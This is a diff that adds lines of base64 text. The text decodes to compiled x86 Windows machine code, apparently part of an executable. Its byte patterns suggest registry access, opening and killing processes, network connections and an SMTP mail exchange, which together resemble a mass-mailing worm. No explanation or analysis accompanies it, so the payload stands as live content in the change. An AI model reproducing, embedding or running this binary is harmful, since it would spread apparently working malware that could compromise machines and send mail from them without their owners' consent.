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
